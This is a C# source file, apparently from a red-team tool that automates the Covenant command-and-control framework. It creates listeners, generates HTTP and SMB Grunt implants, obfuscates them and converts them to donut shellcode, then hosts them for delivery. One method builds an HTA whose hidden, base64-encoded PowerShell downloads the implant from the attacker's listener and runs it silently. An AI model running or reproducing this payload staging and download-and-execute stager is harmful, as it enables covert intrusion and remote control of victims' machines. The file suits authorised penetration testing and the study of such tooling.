
using System;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Collections.Generic;
using McMaster.Extensions.CommandLineUtils;

using System.Threading;
using Microsoft.Win32;
using System.Runtime.InteropServices;
// using Microsoft.Build;
// using Microsoft.Build.Engine;
// using Microsoft.Build.Evaluation;

using Covenant.API;
using Covenant.API.Models;
using System.Net.Http;
using Scorpion.Exceptions;
using Scorpion.Jobs;
using Scorpion.Api;

namespace Scorpion.Jobs
{
  public class SetupJob : Job
  {
    public int DefaultTargetPort = 8080;

    public string TargetDefaultHttpTemplate = "GruntHTTP";
    public string TargetDefaultSmbTemplate = "GruntSMB";

    public SetupJob(IConsole console, CovenantAPI api) : base(console, api) { }

    public async Task<int> RunAsync(string listenerName, string connectAddress, int connectPort, int smbGruntCount)
    {
      var request = new RequestBuilder(Api);

      Console.WriteLine("Creating Data directories");
      var pwd = Directory.GetCurrentDirectory();
      var dataDir = Path.Join(pwd, "Data");
      if (!Directory.Exists(dataDir)) {
        Directory.CreateDirectory(dataDir);
      }

      HttpListener listener = await FindOrCreateListener(listenerName, connectAddress, connectPort);
      Console.WriteLine($"Using listener {listener.Id} - {listener.Name}");
      Console.WriteLine("Creating Basic HTTP Grunt Binary");

      BinaryLauncher binaryLauncher = await GenerateBasicHttpGruntBinary(listener);
      Console.WriteLine($"Using Binary Launcher {binaryLauncher.Name} - {binaryLauncher.Id}");
      var defaultHttpBinPath = Path.Join(dataDir, "app.exe");
      Console.WriteLine("Saving HTTP Grunt Binary");
      File.WriteAllBytes(defaultHttpBinPath, Convert.FromBase64String(binaryLauncher.Base64ILByteString));

      HostedFile hostedBinaryLauncher = await FindOrCreateHostedDefaultHttpGrunt(listener, binaryLauncher);

      HostedFile hostedBinaryLauncherHta = await FindOrCreateHostedDefaultHttpGruntHta(listener, hostedBinaryLauncher);

      var defaultHttpHtaPath = Path.Join(dataDir, "app.hta");
      Console.WriteLine("Saving HTA Script That Dowloands/Execs Default Grunt Binary");
      File.WriteAllBytes(defaultHttpHtaPath, Convert.FromBase64String(hostedBinaryLauncherHta.Content));

      var nugetExePath = DownloadNugetExe(dataDir);
      var donutExePath = DownloadDonutExe(dataDir);

      for (int i = 0; i < smbGruntCount; i++) {
        var aGuid = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);

        await ProvisionSmbGrunt(listener, aGuid, dataDir, nugetExePath, donutExePath);

      }
      return await Task.FromResult(0);
    }

    public async Task<int> ProvisionSmbGrunt(HttpListener listener, string aGuid, string dataDir, string nugetExePath, string donutExePath)
    {
      var request = new RequestBuilder(Api);

      var projDir = Path.Join(dataDir, aGuid);

      if (!Directory.Exists(projDir)) {
        Directory.CreateDirectory(projDir);
      }

      if (!Directory.Exists(Path.Join(projDir, "Properies"))) {
        Directory.CreateDirectory(Path.Join(projDir, "Properties"));
      }

      Console.WriteLine($"Generating csproj for {aGuid}");

      var csproj = GenerateCsprojFile(aGuid, projDir);
      var csprojName = aGuid + ".csproj";
      var csprojPath = Path.Join(projDir, csprojName);
      Console.WriteLine($"Saving csproj for {aGuid}");
      File.WriteAllBytes(csprojPath, Encoding.ASCII.GetBytes(csproj));

      Console.WriteLine($"Generating Obfuscar for {aGuid}");
      var obfuscar = GenerateObfuscarFile(aGuid, projDir);
      var obfuscarName = aGuid + ".xml";
      var obfuscarPath = Path.Join(projDir, obfuscarName);
      Console.WriteLine($"Saving Obfuscar for {aGuid}");
      File.WriteAllBytes(obfuscarPath, Encoding.ASCII.GetBytes(obfuscar));

      BinaryLauncher smbLauncher = await GenerateBasicSmbGruntBinary(aGuid, listener);
      var rawSmbBin = Convert.FromBase64String(smbLauncher.Base64ILByteString);
      var smbBinPath = Path.Join(projDir, "Downloaded.exe");
      Console.WriteLine("Saving Unobfuscated Grunt Binary");
      File.WriteAllBytes(smbBinPath, rawSmbBin);
      var smbSrcPath = Path.Join(projDir, aGuid + ".cs");
      Console.WriteLine("Saving SMB Grunt Stager Code");
      File.WriteAllBytes(smbSrcPath, Encoding.ASCII.GetBytes(smbLauncher.StagerCode));
      Console.WriteLine("Loading csproj for prgramatic build");

      var assemblyInfo = GenerateAssemblyInfo(aGuid);
      var assemblyInfoName = "AssemblyInfo.cs";
      var assemblyInfoPath = Path.Join(Path.Join(projDir, "Properties"), assemblyInfoName);
      Console.WriteLine($"Saving Assembly Info for {aGuid}");
      File.WriteAllBytes(assemblyInfoPath, Encoding.ASCII.GetBytes(assemblyInfo));

      if (System.Runtime.InteropServices.RuntimeInformation.IsOSPlatform(OSPlatform.Windows)) {

        var msbuildPath = FindMsBuildExePath();


        if (!String.IsNullOrEmpty(msbuildPath)) {

          RunInstallNugetDepsForGrunt(projDir, nugetExePath);
          RunMsbuildForGrunt(aGuid, projDir, msbuildPath, csprojName);
          var obfuscatedBinPath = RunObfuscarForGrunt(aGuid, projDir, dataDir, obfuscarPath);
          var hostedUrlPath = "/" + aGuid + ".exe";
          Console.WriteLine($"Hosting obfsucated smb binary at path {hostedUrlPath}");
          var hostedBin = new HostedFile();
          hostedBin.ListenerId = listener.Id;
          hostedBin.Path = hostedUrlPath;
          hostedBin.Content = Convert.ToBase64String(File.ReadAllBytes(obfuscatedBinPath));
          hostedBin = await request.CreateHostedFile((int)listener.Id, hostedBin);
          Console.WriteLine($"Grunt generation complete for {aGuid}");

          WaitForAvailable(Path.Join(dataDir, aGuid + ".exe"));

          var shellcodePath = RunDonutForGrunt(aGuid, projDir, dataDir, donutExePath);
          var shellcodeUrl = "/" + aGuid + ".bin";
          Console.WriteLine($"Hosting obfuscated shellcode (donut) smb binary at path {shellcodeUrl}");
          var hostedShellcode = new HostedFile();
          hostedShellcode.ListenerId = listener.Id;
          hostedShellcode.Path = shellcodeUrl;
          hostedShellcode.Content = Convert.ToBase64String(File.ReadAllBytes(shellcodePath));
          hostedShellcode = await request.CreateHostedFile((int)listener.Id, hostedShellcode);

          Console.WriteLine($"Grunt generation complete for {aGuid}");

        } else {
          Console.WriteLine($"Not able to find directory in C:\\Windows\\Microsoft.Net\\Framework that starts with 'v4.'. Can't find msbuild.exe");
        }

      } else {
        Console.WriteLine("Not on windows. Skipping msbuild.");
      }

      return await Task.FromResult(0);
    }
    public string RunDonutForGrunt(string aGuid, string projDir, string dataDir, string donutExePath)
    {
      var source = Path.Join(dataDir, aGuid + ".exe");
      var gruntShellcodePath = Path.Join(dataDir, aGuid + ".bin");
      // x64, continue on fail, binary,exit with thread
      var args = $"-a 2 -b 3 -f 1 -x 1 -o {gruntShellcodePath} {source}";
      Console.WriteLine($"Generating shellcode...");
      Console.WriteLine($"Donut Path: {donutExePath}");
      Console.WriteLine($"Donut Args: {args}");

      Process donut = new Process();
      ProcessStartInfo startInfo = new ProcessStartInfo();
      // Redirect the output stream of the child process.
      startInfo.UseShellExecute = false;
      startInfo.RedirectStandardOutput = true;
      startInfo.WorkingDirectory = projDir;
      startInfo.FileName = donutExePath;
      startInfo.Arguments = args;
      donut.StartInfo = startInfo;
      donut.Start();
      string output = donut.StandardOutput.ReadToEnd();
      donut.WaitForExit();
      Console.WriteLine(output);
      Console.WriteLine($"Donut Exit Code: {donut.ExitCode}");

      return gruntShellcodePath;

    }

    public string RunObfuscarForGrunt(string aGuid, string projDir, string dataDir, string obfuscarPath)
    {
      string obfuscarBinPath = (string)Path.Join(Path.Join(Path.Join(Path.Join(projDir, "Obfuscar"), "Obfuscar"), "tools"), "Obfuscar.Console.exe");
      string args = Path.Join(projDir, aGuid + ".xml");

      Console.WriteLine($"Obfuscating...");
      Console.WriteLine($"Obfuscar Path: {obfuscarBinPath}");
      Console.WriteLine($"Obfuscar Args: {args}");

      Process obfuscate = new Process();
      ProcessStartInfo startInfo = new ProcessStartInfo();
      // Redirect the output stream of the child process.
      startInfo.UseShellExecute = false;
      startInfo.RedirectStandardOutput = true;
      startInfo.WorkingDirectory = projDir;
      startInfo.FileName = obfuscarBinPath;
      startInfo.Arguments = args;
      obfuscate.StartInfo = startInfo;

      obfuscate.Start();
      string output = obfuscate.StandardOutput.ReadToEnd();
      obfuscate.WaitForExit();

      Console.WriteLine(output);
      Console.WriteLine($"Obfuscate Exit Code: {obfuscate.ExitCode}");
      Console.WriteLine($"Moving msbuild compiled target to Compiled.exe");

      File.Move(Path.Join(projDir, aGuid + ".exe"), Path.Join(projDir, "Compiled.exe"));
      Console.WriteLine($"Moving obfuscated target out of obfuscated directory to Data directory");
      var obfuscatedSmbBinPath = Path.Join(Path.Join(projDir, "obfuscated"), aGuid + ".exe");
      var newSmbBinPath = Path.Join(dataDir, aGuid + ".exe");
      File.Move(obfuscatedSmbBinPath, newSmbBinPath);

      return newSmbBinPath;
    }
    public void RunMsbuildForGrunt(string aGuid, string projDir, string msbuildPath, string csprojName)
    {
      var msbuildArgs = $"{csprojName} /p:Configuration=Release";
      Console.WriteLine($"Building...");
      Console.WriteLine($"Msbuild Path: {msbuildPath}");
      Console.WriteLine($"Msbuild Args: {msbuildArgs}");

      Process build = new Process();
      ProcessStartInfo startInfo = new ProcessStartInfo();
      // Redirect the output stream of the child process.
      startInfo.UseShellExecute = false;
      startInfo.RedirectStandardOutput = true;
      startInfo.WorkingDirectory = projDir;
      startInfo.FileName = msbuildPath;
      startInfo.Arguments = msbuildArgs;

      build.StartInfo = startInfo;
      build.Start();
      string output = build.StandardOutput.ReadToEnd();
      build.WaitForExit();

      Console.WriteLine(output);
      Console.WriteLine($"Build Exit Code: {build.ExitCode}");

    }
    public void RunInstallNugetDepsForGrunt(string projDir, string nugetExePath)
    {
      string obfuscarVersion = "2.2.25";
      var args = $"install obfuscar -o {projDir}\\Obfuscar -Version {obfuscarVersion} -ExcludeVersion";
      Process nugetInstall = new Process();
      ProcessStartInfo startInfo = new ProcessStartInfo();
      // Redirect the output stream of the child process.
      startInfo.UseShellExecute = false;
      startInfo.RedirectStandardOutput = true;
      startInfo.WorkingDirectory = projDir;
      startInfo.FileName = nugetExePath;
      startInfo.Arguments = args;
      nugetInstall.StartInfo = startInfo;
      Console.WriteLine($"Building...");
      nugetInstall.Start();
      string output = nugetInstall.StandardOutput.ReadToEnd();
      nugetInstall.WaitForExit();
      Console.WriteLine(output);
      Console.WriteLine(nugetInstall.ExitCode);
      Console.WriteLine($"Nuget Obfuscar Install Exit Code: {nugetInstall.ExitCode}");
    }

    public async Task<HostedFile> FindOrCreateHostedDefaultHttpGruntHta(HttpListener listener, HostedFile hostedBinaryFile)
    {
      var request = new RequestBuilder(Api);
      Console.WriteLine("Checking a /app.hta Script is already hosted");
      foreach (HostedFile aHostedFile in await request.GetHostedFiles((int)listener.Id)) {
        if (aHostedFile.Path == "/app.hta") {
          Console.WriteLine("Found existing /app.hta. Not creating a new one");
          return aHostedFile;
        }
      }
      Console.WriteLine("Generating HTA Script That Dowloands/Execs Default Grunt Binary");
      var hta = GeneratePullAndExecBinaryHta(listener, hostedBinaryFile);
      Console.WriteLine("Hosting HTA Script That Dowloands/Execs Default Grunt Binary at /app.hta");
      var hostedHta = new HostedFile();
      hostedHta.ListenerId = listener.Id;
      hostedHta.Path = "/app.hta";
      hostedHta.Content = Convert.ToBase64String(Encoding.ASCII.GetBytes(hta));
      return await request.CreateHostedFile((int)listener.Id, hostedHta);
    }
    public async Task<HostedFile> FindOrCreateHostedDefaultHttpGrunt(HttpListener listener, BinaryLauncher launcher)
    {
      var request = new RequestBuilder(Api);
      Console.WriteLine("Checking a /app.exe Grunt is already hosted");
      foreach (HostedFile aHostedFile in await request.GetHostedFiles((int)listener.Id)) {
        if (aHostedFile.Path == "/app.exe") {
          Console.WriteLine("Found existing /app.exe. Not creating a new one");
          return aHostedFile;
        }
      }
      Console.WriteLine("Creating Hosted HTTP Grunt Binary at /app.exe");
      var hostedDefaultHttpBin = new HostedFile();
      hostedDefaultHttpBin.ListenerId = listener.Id;
      hostedDefaultHttpBin.Path = "/app.exe";
      hostedDefaultHttpBin.Content = launcher.Base64ILByteString; // b64 encoded
      Console.WriteLine("Creating Hosted HTTP Grunt Binary");
      return await request.CreateHostedFile((int)listener.Id, hostedDefaultHttpBin);
    }
    public async Task<HttpListener> FindOrCreateListener(string listenerName, string connectAddress, int connectPort)
    {
      var request = new RequestBuilder(Api);
      if (!String.IsNullOrEmpty(listenerName)) {
        Console.WriteLine($"Searching for existing listener with name {listenerName}");
        var rootListener = await request.GetListenerByName(listenerName);
        Console.WriteLine("Converting Listener to HTTPListener");
        return await request.GetHttpListenerById((int)rootListener.Id);
      } else if (!String.IsNullOrEmpty(connectAddress) && connectPort == 0) {
        Console.WriteLine($"Searching for existing listener with connnect address {connectAddress}");
        var listeners = await request.GetListeners();
        foreach (Listener aListener in listeners) {
          foreach (string c in aListener.ConnectAddresses) {
            if (c.ToLower() == connectAddress) {
              Console.WriteLine("Converting Listener to HTTPListener");
              return await request.GetHttpListenerById((int)aListener.Id);
            }
          }
        }
      } else if (!String.IsNullOrEmpty(connectAddress) && connectPort > 0) {
        Console.WriteLine($"Searching for existing listener with connnect address {connectAddress} and connect port {connectPort}");
        var listeners = await request.GetListeners();
        foreach (Listener aListener in listeners) {
          foreach (string c in aListener.ConnectAddresses) {
            if (c.ToLower() == connectAddress && aListener.ConnectPort == connectPort) {
              Console.WriteLine("Converting Listener to HTTPListener");
              return await request.GetHttpListenerById((int)aListener.Id);
            }
          }
        }
      } else if (connectPort > 0) {
        Console.WriteLine($"Searching for existing listener with connect port {connectPort}");
        var listeners = await request.GetListeners();
        foreach (Listener aListener in listeners) {
          foreach (string c in aListener.ConnectAddresses) {
            if (aListener.ConnectPort == connectPort) {
              Console.WriteLine("Converting Listener to HTTPListener");
              return await request.GetHttpListenerById((int)aListener.Id);
            }
          }
        }
      }
      if (!String.IsNullOrEmpty(connectAddress)) {
        if (connectPort == 0) {
          connectPort = DefaultTargetPort;
          Console.WriteLine($"Using default port {connectPort} for new listener");

        }
        Console.WriteLine($"Creatiing listener with connnect address {connectAddress} and connect port {connectPort}");
        return await CreateListener(connectAddress, connectPort);
      }
      Console.WriteLine("Please pass in a ConnectAddress to create a new listener or use an existing listener by name");
      throw new AppException("Unable to find or create listener for setup");
    }



    public async Task<BinaryLauncher> GenerateBasicHttpGruntBinary(HttpListener listener)
    {
      var request = new RequestBuilder(Api);
      var template = await request.GetImplantTemplateByName(TargetDefaultHttpTemplate);
      var now = DateTime.Now;
      var kd = now.AddDays(60);
      var aGuid = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);

      Console.WriteLine($"Generating Binary Launcher for template {template.Name}, listener {listener.Name} ({listener.Id})");

      var bin = new BinaryLauncher();
      // bin.Id = initializedLauncher.Id;

      bin.ListenerId = (int)listener.Id;
      bin.Type = LauncherType.Binary;
      bin.ImplantTemplateId = template.Id;
      bin.Name = "DefaultHttpBin-" + aGuid;
      bin.Description = "Default HTTP Binary " + aGuid;
      bin.DotNetFrameworkVersion = DotNetVersion.Net40;
      bin.ValidateCert = true;
      bin.UseCertPinning = true;
      bin.SmbPipeName = "doesnotmatter" + aGuid;
      bin.JitterPercent = 10;
      bin.Delay = 1;
      bin.ConnectAttempts = 5000;
      bin.KillDate = kd;
      // bin.LauncherString = "";
      // bin.StagerCode = "";
      // bin.Base64ILByteString = "";
      bin.OutputKind = OutputKind.ConsoleApplication;
      bin.CompressStager = true;
      var l = await request.CreateBinaryLauncher(bin);

      Console.WriteLine("Initializing Binary Launcher");
      return await request.InitBinaryLauncher();
    }


    public async Task<BinaryLauncher> GenerateBasicSmbGruntBinary(string aGuid, HttpListener listener)
    {
      var request = new RequestBuilder(Api);
      var template = await request.GetImplantTemplateByName(TargetDefaultSmbTemplate);
      var now = DateTime.Now;
      var kd = now.AddDays(60);

      var bin = new BinaryLauncher();
      bin.ListenerId = listener.Id;
      bin.Name = "SmbBin-" + aGuid;
      bin.Description = "SMB Binary " + aGuid;
      bin.DotNetFrameworkVersion = DotNetVersion.Net40;
      bin.Type = LauncherType.Binary;
      bin.ImplantTemplateId = template.Id;
      bin.ValidateCert = true;
      bin.UseCertPinning = true;
      bin.SmbPipeName = aGuid;
      bin.JitterPercent = 10;
      bin.Delay = 1;
      bin.ConnectAttempts = 5000;
      bin.KillDate = kd;
      // bin.LauncherString = "";
      // bin.StagerCode = "";
      // bin.Base64ILByteString = "";
      bin.OutputKind = OutputKind.ConsoleApplication;
      bin.CompressStager = true;
      var b = await request.CreateBinaryLauncher(bin);
      Console.WriteLine("Initializing Binary Launcher");
      return await request.InitBinaryLauncher();
    }

    public async Task<HttpListener> CreateListener(string connectAddress, int connectPort)
    {
      var request = new RequestBuilder(Api);

      var connectAddresses = new List<string>();
      var profileName = "CustomHttpProfile";
      var profile = await request.GetProfileByName(profileName);
      var listenerTypeName = "HTTP";
      var listenerType = await request.GetListenerTypeByName(listenerTypeName);

      connectAddresses.Add(connectAddress);
      var urls = new List<string>();
      urls.Add($"http://{connectAddress}:{connectPort}");

      HttpListener httpListener = new HttpListener();
      httpListener.Name = "default";
      httpListener.Description = "Default Listener";
      httpListener.Guid = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
      httpListener.BindAddress = "0.0.0.0";
      httpListener.BindPort = connectPort;
      httpListener.Urls = urls;
      httpListener.ConnectAddresses = connectAddresses;
      httpListener.ConnectPort = connectPort;
      httpListener.ProfileId = (int)profile.Id;
      httpListener.ListenerTypeId = (int)listenerType.Id;
      httpListener.Status = ListenerStatus.Active;
      httpListener.UseSSL = false;
      httpListener.Validate();
      Console.WriteLine("Creating listener...");
      HttpListener listener = await request.CreateHttpListener(httpListener);
      Console.WriteLine("Listener created");
      return listener;
    }

    public string DownloadDonutExe(string dataDir)
    {
      var donutExePath = Path.Join(dataDir, "donut.exe");
      var donutZipPath = Path.Join(dataDir, "donut.zip");
      var donutExtractPath = Path.Join(dataDir, "donut");

      if (!File.Exists(donutExePath)) {
        if (File.Exists(donutZipPath)) {
          File.Delete(donutZipPath);
        }
        if (Directory.Exists(donutExtractPath)) {
          DirectoryInfo donutExtractPathInfo = new DirectoryInfo(donutExtractPath);
          foreach (FileInfo file in donutExtractPathInfo.GetFiles()) file.Delete();
          foreach (DirectoryInfo subDirectory in donutExtractPathInfo.GetDirectories()) subDirectory.Delete(true);
        }
        Console.WriteLine("Downloading donut.exe");
        var wc = new System.Net.WebClient();
        var donutDlUrl = "https://github.com/TheWover/donut/releases/download/v0.9.3/donut_v0.9.3.zip";
        wc.DownloadFile(donutDlUrl, donutZipPath);
        System.IO.Compression.ZipFile.ExtractToDirectory(donutZipPath, donutExtractPath);
        File.Move(Path.Join(donutExtractPath, "donut.exe"), donutExePath);
      }
      return donutExtractPath;
    }

    public string FindMsBuildExePath()
    {
      var frameworkDir = "C:\\Windows\\Microsoft.Net\\Framework";
      Console.WriteLine($"Finding v4.x msbuild.exe by walking {frameworkDir}");

      var candidateDirs = Directory.GetDirectories(frameworkDir);
      string frameworkVersionDir = "";
      foreach (string candidate in candidateDirs) {
        if (new DirectoryInfo(candidate).Name.StartsWith("v4.")) {
          Console.WriteLine($"Found msbuild.exe at {candidate}");
          frameworkVersionDir = Path.Join(frameworkDir, new DirectoryInfo(candidate).Name);
          break;
        }
      }
      if (!String.IsNullOrEmpty(frameworkVersionDir)) {
        return Path.Join(frameworkVersionDir, "msbuild.exe");
      }
      return "";
    }
    public string DownloadNugetExe(string dataDir)
    {
      var nugetExePath = Path.Join(dataDir, "nuget.exe");
      if (!File.Exists(nugetExePath)) {
        Console.WriteLine("Downloading nuget.exe");
        var wc = new System.Net.WebClient();
        var nugetDlUrl = "https://dist.nuget.org/win-x86-commandline/latest/nuget.exe";
        wc.DownloadFile(nugetDlUrl, nugetExePath);
      }
      return nugetExePath;
    }

    public string GeneratePullAndExecBinaryHta(HttpListener listener, HostedFile hostedFile)
    {
      // TODO: make sure path starts with /
      var script = string.Format(@"
$loc = ""\Users\Public\Downloads\app-"" + (Get-Date).ToString(""yyyyMMddHHmmss"") + "".exe"";
(New-Object Net.WebClient).DownloadFile('http://{0}{1}', $loc);
Start-Process -FilePath $loc -WindowStyle Hidden;
Write-Output ""Error"";
", listener.ConnectAddresses[0], hostedFile.Path);
      var covertedScript = Encoding.GetEncoding("UTF-16LE").GetBytes(script);
      var encodedScript = Convert.ToBase64String(covertedScript);
      var hta = string.Format(@"
<script language=""VBScript"">
    Function DoStuff()
        Dim wsh
        Set wsh = CreateObject(""Wscript.Shell"")
        wsh.run ""powershell -Sta -Nop -Window Hidden -EncodedCommand {0}""
        set wsh = Nothing
     End Function
     DoStuff
     self.close
</script>", encodedScript);
      return hta;
    }
    public string GenerateObfuscarFile(string aGuid, string projDir)
    {
      var obfuscarXml = String.Format(@"<?xml version=""1.0"" encoding=""utf-8""?>
<Obfuscator>
	<Var name=""InPath"" value=""."" />
	<Var name=""OutPath"" value=""{0}\obfuscated"" />
	<Var name=""KeepPublicApi"" value=""false"" />
	<Var name=""HidePrivateApi"" value=""true"" />
	<Module file=""{1}"" />
</Obfuscator>", projDir, Path.Join(projDir, aGuid + ".exe"));
      return obfuscarXml;
    }

    public string GenerateAssemblyInfo(string aGuid)
    {
      return String.Format(@"using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

// General Information about an assembly is controlled through the following
// set of attributes. Change these attribute values to modify the information
// associated with an assembly.
[assembly: AssemblyTitle(""{0}"")]
[assembly: AssemblyDescription("""")]
[assembly: AssemblyConfiguration("""")]
[assembly: AssemblyCompany("""")]
[assembly: AssemblyProduct(""{0}"")]
[assembly: AssemblyCopyright(""Copyright ©  2020"")]
[assembly: AssemblyTrademark("""")]
[assembly: AssemblyCulture("""")]

// Setting ComVisible to false makes the types in this assembly not visible
// to COM components.  If you need to access a type in this assembly from
// COM, set the ComVisible attribute to true on that type.
[assembly: ComVisible(false)]

// The following GUID is for the ID of the typelib if this project is exposed to COM
[assembly: Guid(""7569d42d-2249-4715-930f-f632ab0f8c8c"")]

// Version information for an assembly consists of the following four values:
//
//      Major Version
//      Minor Version
//      Build Number
//      Revision
//
// You can specify all the values or you can default the Build and Revision Numbers
// by using the '*' as shown below:
// [assembly: AssemblyVersion(""1.0.*"")]
[assembly: AssemblyVersion(""1.0.0.0"")]
[assembly: AssemblyFileVersion(""1.0.0.0"")]
", aGuid);
    }

    public string GenerateCsprojFile(string aGuid, string projDir)
    {
      var csproj = String.Format(@"<?xml version=""1.0"" encoding=""utf-8""?>
<Project DefaultTarget=""Build"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">
  <Import Project=""$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props"" Condition=""Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')"" />
  <Target Name=""Build"">
    <Csc Sources=""@(Compile)"" OutputAssembly=""$(OutputPath)\{0}.exe"" />
  </Target>  
  <PropertyGroup>
    <Configuration Condition="" '$(Configuration)' == '' "">Debug</Configuration>
    <Platform Condition="" '$(Platform)' == '' "">AnyCPU</Platform>
    <ProjectGuid>{{70FD0877-6515-4D14-B830-AA470E7C1AFD}}</ProjectGuid>
    <OutputType>Exe</OutputType>
    <RootNamespace>GruntStager</RootNamespace>
    <AssemblyName>{0}</AssemblyName>
    <TargetName>{0}</TargetName>
    <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
    <FileAlignment>512</FileAlignment>
    <Deterministic>true</Deterministic>
    <NuGetPackageImportStamp>
    </NuGetPackageImportStamp>
  </PropertyGroup>
  <PropertyGroup Condition="" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' "">
    <PlatformTarget>AnyCPU</PlatformTarget>
    <DebugSymbols>true</DebugSymbols>
    <DebugType>full</DebugType>
    <Optimize>false</Optimize>
    <OutputPath>{1}</OutputPath>
    <DefineConstants>DEBUG;TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
  </PropertyGroup>
  <PropertyGroup Condition="" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' "">
    <PlatformTarget>x64</PlatformTarget>
    <DebugType>pdbonly</DebugType>
    <Optimize>true</Optimize>
    <OutputPath>{1}</OutputPath>
    <DefineConstants>TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
      <PostBuildEventUseInBuild>true</PostBuildEventUseInBuild>
  </PropertyGroup>
  <ItemGroup>
    <Reference Include=""System"" />
    <Reference Include=""System.Core"" />
    <Reference Include=""System.Xml.Linq"" />
    <Reference Include=""System.Data.DataSetExtensions"" />
    <Reference Include=""Microsoft.CSharp"" />
    <Reference Include=""System.Data"" />
    <Reference Include=""System.Xml"" />
  </ItemGroup>
  <ItemGroup>
    <Compile Include=""{0}.cs"" />
    <Compile Include=""Properties\AssemblyInfo.cs"" />
  </ItemGroup>
  <Target Name=""EnsureNuGetPackageBuildImports"" BeforeTargets=""PrepareForBuild"">
    <PropertyGroup>
      <ErrorText>This project references NuGet package(s) that are missing on this computer. Use NuGet Package Restore to download them.  For more information, see http://go.microsoft.com/fwlink/?LinkID=322105. The missing file is {{{{0}}.</ErrorText>
    </PropertyGroup>
  </Target>
</Project>", aGuid, projDir);
      return csproj;
    }
    public int WaitForAvailable(string file, int limit = 10)
    {
      var rLimit = limit * 2;
      var count = 0;
      while (true) {
        try {
          count = count + 1;
          using (Stream stream = new FileStream(file, FileMode.Open, FileAccess.ReadWrite, FileShare.None)) {
            Console.WriteLine($"File is available: {file}");
            Thread.Sleep(500);
          }
          Thread.Sleep(500);
          return 0;

        } catch (Exception ex) {
          Console.WriteLine($"File is not available. Waiting");

          if (count > rLimit) {
            Console.WriteLine($"File is not available. Limit reached");

            throw ex;
          }
          Thread.Sleep(500);

        }
      }
    }
  }
}
